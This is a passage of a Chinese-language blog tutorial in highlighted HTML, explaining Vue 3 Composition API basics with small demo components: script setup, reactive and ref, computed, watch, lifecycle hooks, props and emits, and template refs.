message,</span></span><br><span class="line"><span class="language-javascript">                printMsg</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;printMsg&quot;</span>&gt;</span>打印<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>语法糖写法</strong>：</p><p>在 script 标签内加入 setup，顶层的绑定会被暴露给模板，实现代码的简化</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> message = <span class="string">&#x27;Hello Vue3&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">printMsg</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(message);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;printMsg&quot;</span>&gt;</span>打印<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>原理</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331153013.png" alt="image.png"></p><h2 id="reactive-和-ref-函数"><a href="#reactive-和-ref-函数" class="headerlink" title="reactive 和 ref 函数"></a>reactive 和 ref 函数</h2><p><strong>reactive()：</strong></p><p>作用：接受<strong>对象类型</strong>数据的参数传入并返回一个<strong>响应式</strong>的对象</p><ol><li>从 vue 包中导入 reactive 函数</li><li>在 <code>&lt;script setup&gt;</code> 中执行 reactive 函数并传入<strong>类型为对象</strong>的初始值，并使用变量接收返回值</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; reactive &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">count</span>: <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">setCount</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        state.<span class="property">count</span>++</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; state.count &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;setCount&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ref()：</strong></p><p>作用：接受<strong>简单类型或者对象类型的数据</strong>传入并返回一个响应式的对象</p><ol><li>从 vue 包中导入 ref 函数 </li><li>在 <code>&lt;script setup&gt;</code> 中执行 ref 函数并传入初始值，并使用变量接收返回值</li><li>在脚本 script 当中调用需要 .value ，在模块中则直接调用</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> state = <span class="title function_">ref</span>(<span class="number">100</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">setCount</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        state.<span class="property">value</span>++</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; state &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;setCount&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对比</strong>：</p><ol><li>reactive 不能处理简单类型的数据 </li><li>ref 参数类型支持更好但是必须通过 .value 访问修改 </li><li>ref 函数的内部实现依赖于 reactive 函数</li><li>实际开发推荐使用 ref</li></ol><h2 id="computed-计算属性函数"><a href="#computed-计算属性函数" class="headerlink" title="computed 计算属性函数"></a>computed 计算属性函数</h2><p>写法和 Vue2 一样，组合式API中的计算属性只是修改了写法</p><ol><li>导入 computed 函数</li><li>执行函数，在回调参数中 return 基于响应式数据做计算的值，用变量接收</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref, computed &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> list = <span class="title function_">ref</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>])</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> comList = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> list.<span class="property">value</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item % <span class="number">2</span> === <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">addFn</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        list.<span class="property">value</span>.<span class="title function_">push</span>(list.<span class="property">value</span>[list.<span class="property">value</span>.<span class="property">length</span>-<span class="number">1</span>]+<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>原始数组：&#123;&#123; list &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>筛选数组：&#123;&#123; comList &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addFn&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>计算属性中，不能出现异步请求&#x2F;修改DOM等操作</li><li>计算属性为只读，特殊情况可以使用 get 、set</li></ol><h2 id="watch-侦听器"><a href="#watch-侦听器" class="headerlink" title="watch 侦听器"></a>watch 侦听器</h2><p>作用：侦听一个或者多个数据的变化，数据变化时执行回调函数 </p><p>额外参数：</p><ul><li>immediate：在侦听器被创建时就立刻执行</li><li>deep：侦听的深浅程度，默认是浅度侦听，只能侦听简单数据，设为 true 则为深度侦听，可以侦听复杂数据</li></ul><p>步骤：</p><ol><li>导入 watch 函数</li><li>执行 watch 函数传入要侦听的响应式数据（ ref 数据）和回调函数</li><li>可以同时侦听多个响应式数据的变化，以数组的形式传入和获取</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref, watch &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> man = <span class="title function_">ref</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">age</span>: <span class="number">18</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">grow</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        man.<span class="property">value</span>.<span class="property">age</span>++</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">watch</span>(man, <span class="function">(<span class="params">newValue</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`现在是<span class="subst">$&#123;newValue.age&#125;</span>岁`</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;,&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">immediate</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">deep</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>有位靓仔：&#123;&#123; man.name &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>现在年龄：&#123;&#123; man.age &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;grow&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="生命周期函数"><a href="#生命周期函数" class="headerlink" title="生命周期函数"></a>生命周期函数</h2><p>Vue3 的生命周期函数有选项式和组合式两种：</p><table><thead><tr><th>选项式API</th><th>组合式API</th></tr></thead><tbody><tr><td>beforeCreate &#x2F; created</td><td>setup</td></tr><tr><td>beforeMount</td><td>onBeforeMount</td></tr><tr><td>mounted</td><td>onMounted</td></tr><tr><td>beforeUpdate</td><td>onBeforeUpdate</td></tr><tr><td>updated</td><td>onUpdated</td></tr><tr><td>beforeUnmount</td><td>onBeforeUnmount</td></tr><tr><td>unmounted</td><td>onUnmounted</td></tr></tbody></table><p>步骤：</p><ol><li>导入生命周期函数</li><li>执行生命周期函数，传入回调函数</li><li>生命周期函数可以执行多次，多次执行时传入的回调会在时机成熟时依次执行</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; onMounted &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">getList</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;发送请求，获取数据&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getList</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发mount1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发mount2&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331203141.png" alt="image.png"></p><h2 id="父子通信"><a href="#父子通信" class="headerlink" title="父子通信"></a>父子通信</h2><p>父传子：</p><ol><li>父组件中给子组件绑定属性</li><li>子组件内部通过 props 选项接收</li><li>通过 defineProps ”编译器宏“ 接收子组件传递的数据</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- App.vue 父组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> sonCom <span class="keyword">from</span> <span class="string">&#x27;@/components/son-com.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sonCom</span> <span class="attr">message</span>=<span class="string">&quot;Xiaomi SU7&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">sonCom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- son-com.vue 子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> props = <span class="title function_">defineProps</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">message</span>: <span class="title class_">String</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(props);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>defineProps 原理：就是编译阶段的一个标识，实际编译器解析时，遇到后会进行编译转换</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331205845.png" alt="image.png"></p><p>子传父：</p><ol><li>父组件中给子组件标签通过 @绑定事件</li><li>子组件内部通过 emit 方法触发事件</li><li>通过 defineEmits 编译器宏生成 emit 方法</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- App.vue 父组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> sonCom <span class="keyword">from</span> <span class="string">&#x27;@/components/son-com.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> car = <span class="title function_">ref</span>(<span class="string">&quot;Xiaomi SU7&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">addMessage</span> = (<span class="params">Msg</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        car.<span class="property">value</span> = car.<span class="property">value</span> + <span class="title class_">Msg</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sonCom</span> <span class="attr">:message</span>=<span class="string">car</span> @<span class="attr">add-message</span>=<span class="string">&quot;addMessage&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">sonCom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- son-com.vue 子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> props = <span class="title function_">defineProps</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">message</span>: <span class="title class_">String</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(props);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">&#x27;addMessage&#x27;</span>])</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">sendMsg</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">emit</span>(<span class="string">&#x27;addMessage&#x27;</span>, <span class="string">&#x27;大卖！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendMsg&quot;</span>&gt;</span>祝贺<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="模板引用"><a href="#模板引用" class="headerlink" title="模板引用"></a>模板引用</h2><p>引用 DOM 或者组件时，使用 ref 函数获取</p><p>使用：</p><ol><li>调用 ref 函数生成一个 ref 对象</li><li>通过 ref 标识绑定 ref 对象到标签</li><li>组件的属性和方法通过 defineExpose 编译宏指定允许父组件访问</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331220012.png" alt="image.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- App.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> sonCom <span class="keyword">from</span> <span class="string">&#x27;@/components/son-com.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> car = <span class="title function_">ref</span>(<span class="string">&quot;Xiaomi SU7&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">addMessage</span> = (<span class="params">Msg</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        car.<span class="property">value</span> = car.<span class="property">value</span> + <span class="title class_">Msg</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> inp = <span class="title function_">ref</span>(<span class="literal">null</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">getCount</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(inp.<span class="property">value</span>.<span class="property">count</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sonCom</span> <span class="attr">:message</span>=<span class="string">car</span> @<span class="attr">add-message</span>=<span class="string">&quot;addMessage&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;inp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">sonCom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getCount&quot;</span>&gt;</span>获取次数<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> props = <span class="title function_">defineProps</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">message</span>: <span class="title class_">String</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(props);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">&#x27;addMessage&#x27;</span>])</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">sendMsg</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">emit</span>(<span class="string">&#x27;addMessage&#x27;</span>, <span class="string">&#x27;大卖！&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript">        count.<span class="property">value</span>++</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">defineExpose</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        count</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendMsg&quot;</span>&gt;</span>祝贺<span 